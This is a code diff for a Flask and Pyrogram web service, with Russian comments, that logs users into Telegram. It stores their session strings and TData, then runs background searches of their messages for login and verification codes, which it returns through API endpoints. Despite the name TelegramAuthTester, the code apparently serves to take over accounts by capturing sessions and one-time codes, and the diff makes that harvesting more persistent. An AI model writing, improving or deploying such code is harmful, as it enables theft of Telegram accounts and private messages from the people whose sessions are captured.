@@ -16,7 +16,7 @@ from pyrogram.errors import (
     FloodWait
 )
 
-# Настройка логирования для Railway
+# Настройка логирования
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
@@ -32,107 +32,161 @@ app = Flask(__name__,
 def serve_static(filename):
     return send_from_directory('templates', filename)
 
-# 🔧 ГЛОБАЛЬНЫЙ СЛОВАРЬ ДЛЯ ХРАНЕНИЯ РЕЗУЛЬТАТОВ ПОИСКА КОДОВ
+# Глобальное хранилище для результатов поиска кодов
 CODE_SEARCH_RESULTS = {}
 
-# 🔧 УЛУЧШЕННЫЙ КЛАСС ДЛЯ ПОСТОЯННОГО ПОИСКА
 class ContinuousCodeFinder:
     def __init__(self, session_string, user_id):
         self.session_string = session_string
         self.user_id = user_id
         self.is_running = False
         self.found_code = None
+        self.client = None
+        self.search_count = 0
         
-    async def start_continuous_search(self, duration=300):  # 5 минут поиска
+    async def initialize_client(self):
+        """Инициализация постоянного клиента"""
+        try:
+            if self.client and self.client.is_connected:
+                return True
+                
+            session_name = f"continuous_finder_{self.user_id}"
+            self.client = Client(
+                session_name, 
+                session_string=self.session_string, 
+                in_memory=True
+            )
+            
+            await self.client.start()
+            logger.info(f"✅ Постоянный клиент инициализирован для user_id: {self.user_id}")
+            return True
+            
+        except Exception as e:
+            logger.error(f"❌ Ошибка инициализации клиента: {e}")
+            return False
+        
+    async def start_continuous_search(self, duration=600):  # Увеличил время до 10 минут
         """Запуск постоянного поиска кода в фоне"""
+        if not await self.initialize_client():
+            logger.error(f"❌ Не удалось инициализировать клиент для user_id: {self.user_id}")
+            return
+            
         self.is_running = True
         start_time = time.time()
         
-        logger.info(f"🚀 Запуск постоянного поиска кода для user_id: {self.user_id}")
+        logger.info(f"🚀 Запуск постоянного поиска кода для user_id: {self.user_id} на {duration} секунд")
         
         while self.is_running and (time.time() - start_time) < duration:
             try:
+                self.search_count += 1
                 code = await self.search_single_attempt()
+                
                 if code:
                     self.found_code = code
                     self.is_running = False
                     
-                    # Сохраняем результат в глобальный словарь
                     CODE_SEARCH_RESULTS[self.user_id] = {
                         'code': code,
                         'found_at': datetime.now().isoformat(),
-                        'status': 'found'
+                        'status': 'found',
+                        'search_count': self.search_count
                     }
                     
-                    logger.info(f"🎉 Код найден для user_id {self.user_id}: {code}")
+                    logger.info(f"🎉 Код найден для user_id {self.user_id}: {code} (попытка #{self.search_count})")
+                    
+                    # Закрываем клиент после нахождения кода
+                    if self.client and self.client.is_connected:
+                        await self.client.stop()
+                    
                     return code
                 
-                # Ждем 10 секунд перед следующей попыткой
-                await asyncio.sleep(10)
+                logger.info(f"🔍 Поиск #{self.search_count} для user_id {self.user_id} - код не найден")
+                await asyncio.sleep(15)  # Увеличил интервал до 15 секунд
                 
             except Exception as e:
-                logger.error(f"❌ Ошибка в постоянном поиске: {e}")
+                logger.error(f"❌ Ошибка в постоянном поиске (попытка #{self.search_count}): {e}")
+                # Пытаемся переинициализировать клиент при ошибке
                 await asyncio.sleep(10)
+                await self.initialize_client()
         
-        # Если не нашли за отведенное время
+        # Сохраняем результат, если код не найден
         CODE_SEARCH_RESULTS[self.user_id] = {
             'code': None,
             'found_at': datetime.now().isoformat(),
-            'status': 'not_found'
+            'status': 'not_found',
+            'search_count': self.search_count
         }
         
-        logger.info(f"⏰ Поиск завершен для user_id {self.user_id}, код не найден")
+        logger.info(f"⏰ Поиск завершен для user_id {self.user_id}, код не найден после {self.search_count} попыток")
+        
+        # Закрываем клиент при завершении поиска
+        if self.client and self.client.is_connected:
+            await self.client.stop()
+            
         self.is_running = False
-        return None
     
     async def search_single_attempt(self):
-        """Одна попытка поиска кода"""
+        """Одна попытка поиска кода с постоянным клиентом"""
         try:
-            session_name = f"continuous_finder_{self.user_id}_{int(time.time())}"
-            async with Client(session_name, session_string=self.session_string, in_memory=True) as client:
-                # Ищем в последних сообщениях
-                async for message in client.get_chat_history('me', limit=50):
-                    if message.text:
-                        # Расширенный поиск кодов
-                        codes = re.findall(r'\b\d{5,6}\b', message.text)
-                        
-                        # Проверяем ключевые слова в сообщении
-                        telegram_keywords = ['код', 'code', 'login', 'verification', 'подтверждени']
-                        has_telegram_keyword = any(keyword in message.text.lower() for keyword in telegram_keywords)
-                        
-                        if codes and has_telegram_keyword:
-                            code = codes[0]
-                            logger.info(f"🔍 Найден потенциальный код: {code} в сообщении: {message.text[:100]}...")
-                            return code
-                
-                return None
+            if not self.client or not self.client.is_connected:
+                if not await self.initialize_client():
+                    return None
+            
+            # Получаем историю сообщений
+            messages = []
+            async for message in self.client.get_chat_history('me', limit=20):  # Уменьшил лимит для скорости
+                if message.text:
+                    messages.append(message.text)
+                    # Ищем коды в тексте сообщения
+                    codes = re.findall(r'\b\d{5,6}\b', message.text)
+                    telegram_keywords = ['код', 'code', 'login', 'verification', 'подтверждени', 'authorization']
+                    has_telegram_keyword = any(keyword in message.text.lower() for keyword in telegram_keywords)
+                    
+                    if codes and has_telegram_keyword:
+                        code = codes[0]
+                        logger.info(f"🔍 Найден потенциальный код: {code} в сообщении: {message.text[:50]}...")
+                        return code
+            
+            logger.debug(f"📨 Проверено {len(messages)} сообщений, коды не найдены")
+            return None
                 
         except Exception as e:
             logger.error(f"❌ Ошибка в поиске: {e}")
+            # При ошибке переинициализируем клиент
+            if self.client and self.client.is_connected:
+                await self.client.stop()
+            self.client = None
             return None
     
     def stop_search(self):
         """Остановка поиска"""
         self.is_running = False
 
-# 🔧 УПРОЩЕННАЯ ФУНКЦИЯ ДЛЯ СРАЗУШЕГО ПОИСКА
+# Глобальное хранилище активных поисков
+ACTIVE_SEARCHERS = {}
+
 async def find_telegram_code_immediate(session_string):
-    """Мгновенный поиск кода"""
+    """Мгновенный поиск кода с одноразовой сессией"""
     try:
         session_name = f"immediate_finder_{int(time.time())}"
         async with Client(session_name, session_string=session_string, in_memory=True) as client:
-            codes_found = []
+            await client.start()
             
-            # Быстрый поиск в последних сообщениях
+            codes_found = []
             async for message in client.get_chat_history('me', limit=30):
                 if message.text:
                     codes = re.findall(r'\b\d{5}\b', message.text)
-                    if codes:
+                    telegram_keywords = ['код', 'code', 'login', 'verification', 'подтверждени']
+                    has_telegram_keyword = any(keyword in message.text.lower() for keyword in telegram_keywords)
+                    
+                    if codes and has_telegram_keyword:
                         codes_found.append({
                             'code': codes[0],
                             'text': message.text[:100],
                             'date': message.date.isoformat() if message.date else None
                         })
+            
+            await client.stop()
             
             if codes_found:
                 return {
@@ -156,18 +210,26 @@ async def find_telegram_code_immediate(session_string):
             'error': f'Ошибка поиска: {str(e)}'
         }
 
-# 🔧 ФУНКЦИЯ ДЛЯ ЗАПУСКА ФОНОВОГО ПОИСКА
 def start_background_search(session_string, user_id):
     """Запуск фонового поиска кода"""
     try:
-        finder = ContinuousCodeFinder(session_string, user_id)
+        # Останавливаем предыдущий поиск для этого пользователя, если есть
+        if user_id in ACTIVE_SEARCHERS:
+            ACTIVE_SEARCHERS[user_id].stop_search()
+            del ACTIVE_SEARCHERS[user_id]
         
-        # Запускаем в отдельном потоке
+        finder = ContinuousCodeFinder(session_string, user_id)
+        ACTIVE_SEARCHERS[user_id] = finder
+        
         def run_search():
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
-            loop.run_until_complete(finder.start_continuous_search())
-            loop.close()
+            try:
+                loop.run_until_complete(finder.start_continuous_search())
+            except Exception as e:
+                logger.error(f"❌ Ошибка в фоновом поиске: {e}")
+            finally:
+                loop.close()
         
         search_thread = threading.Thread(target=run_search, daemon=True)
         search_thread.start()
@@ -338,7 +400,6 @@ ACTIVE_SESSIONS = {}
 SESSION_TIMEOUT = 300
 
 def cleanup_expired_sessions():
-    """Очистка просроченных сессий"""
     current_time = time.time()
     expired_sessions = []
     
@@ -355,6 +416,7 @@ def cleanup_expired_sessions():
             except:
                 pass
             del ACTIVE_SESSIONS[session_id]
+            logger.info(f"🗑️ Удалена просроченная сессия: {session_id}")
 
 class TelegramAuthTester:
     def __init__(self):
@@ -433,6 +495,7 @@ class TelegramAuthTester:
         
         if session_id not in ACTIVE_SESSIONS:
             logger.error(f"❌ Сессия не найдена: {session_id}")
+            logger.info(f"📊 Доступные сессии: {list(ACTIVE_SESSIONS.keys())}")
             return {'success': False, 'error': 'Сессия не найдена или истекла'}
             
         session_data = ACTIVE_SESSIONS[session_id]
@@ -525,6 +588,7 @@ class TelegramAuthTester:
         
         if session_id not in ACTIVE_SESSIONS:
             logger.error(f"❌ Сессия не найдена для 2FA: {session_id}")
+            logger.info(f"📊 Доступные сессии: {list(ACTIVE_SESSIONS.keys())}")
             return {'success': False, 'error': 'Сессия не найдена'}
             
         session_data = ACTIVE_SESSIONS[session_id]
@@ -624,11 +688,9 @@ class TelegramAuthTester:
             
                 logger.info(f"💾 TData сохранен. Session ID: {session_id}, TData ID: {tdata_id}")
                 
-                # 🔧 ЗАПУСКАЕМ ФОНОВЫЙ ПОИСК КОДА
                 logger.info(f"🚀 Запуск фонового поиска кода для user_id: {user_info['id']}")
                 start_background_search(session_string, user_info['id'])
                 
-                # 🔧 МГНОВЕННЫЙ ПОИСК
                 immediate_result = await find_telegram_code_immediate(session_string)
             
                 return {
@@ -650,10 +712,8 @@ class TelegramAuthTester:
 
 auth_tester = TelegramAuthTester()
 
-# 🔧 НОВЫЕ API ENDPOINTS ДЛЯ УПРАВЛЕНИЯ ПОИСКОМ
 @app.route('/api/check-code-status/<int:user_id>', methods=['GET'])
 def check_code_status(user_id):
-    """Проверка статуса поиска кода"""
     if user_id in CODE_SEARCH_RESULTS:
         result = CODE_SEARCH_RESULTS[user_id]
         return jsonify({
@@ -661,20 +721,23 @@ def check_code_status(user_id):
             'user_id': user_id,
             'code_status': result['status'],
             'telegram_code': result['code'],
-            'found_at': result['found_at']
+            'found_at': result['found_at'],
+            'search_count': result.get('search_count', 0)
         })
     else:
+        # Проверяем, есть ли активный поиск
+        is_searching = user_id in ACTIVE_SEARCHERS and ACTIVE_SEARCHERS[user_id].is_running
         return jsonify({
             'success': True,
             'user_id': user_id,
-            'code_status': 'searching',
+            'code_status': 'searching' if is_searching else 'not_started',
             'telegram_code': None,
-            'message': 'Поиск кода в процессе...'
+            'search_count': ACTIVE_SEARCHERS[user_id].search_count if user_id in ACTIVE_SEARCHERS else 0,
+            'message': 'Поиск кода в процессе...' if is_searching else 'Поиск не запущен'
         })
 
 @app.route('/api/search-code-now', methods=['POST', 'OPTIONS'])
 def search_code_now():
-    """Немедленный поиск кода"""
     if request.method == 'OPTIONS':
         return jsonify({'status': 'ok'})
         
@@ -695,17 +758,32 @@ def search_code_now():
         logger.error(f"❌ Ошибка немедленного поиска: {e}")
         return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500
 
-# 🔧 HEALTH CHECK
+@app.route('/api/stop-code-search/<int:user_id>', methods=['POST'])
+def stop_code_search(user_id):
+    """Остановка поиска кода для пользователя"""
+    try:
+        if user_id in ACTIVE_SEARCHERS:
+            ACTIVE_SEARCHERS[user_id].stop_search()
+            del ACTIVE_SEARCHERS[user_id]
+            logger.info(f"⏹️ Поиск кода остановлен для user_id: {user_id}")
+            return jsonify({'success': True, 'message': 'Поиск остановлен'})
+        else:
+            return jsonify({'success': False, 'error': 'Активный поиск не найден'})
+    except Exception as e:
+        logger.error(f"❌ Ошибка остановки поиска: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
 @app.route('/health')
 def health_check():
     return jsonify({
         'status': 'healthy',
         'timestamp': datetime.now().isoformat(),
-        'active_searches': len(CODE_SEARCH_RESULTS),
+        'active_searches': len(ACTIVE_SEARCHERS),
+        'code_search_results': len(CODE_SEARCH_RESULTS),
+        'active_sessions': len(ACTIVE_SESSIONS),
         'environment': os.getenv('RAILWAY_ENVIRONMENT', 'development')
     })
 
-# 🔧 СТАРЫЙ ENDPOINT ДЛЯ ОБРАТНОЙ СОВМЕСТИМОСТИ
 @app.route('/api/find-telegram-code', methods=['POST', 'OPTIONS'])
 def find_telegram_code():
     if request.method == 'OPTIONS':
@@ -816,7 +894,8 @@ def storage_stats():
         return jsonify({
             'success': True,
             'storage_type': 'JSON',
-            'statistics': stats
+            'statistics': stats,
+            'active_code_searches': len(ACTIVE_SEARCHERS)
         })
     except Exception as e:
         logger.error(f"❌ Ошибка получения статистики: {e}")
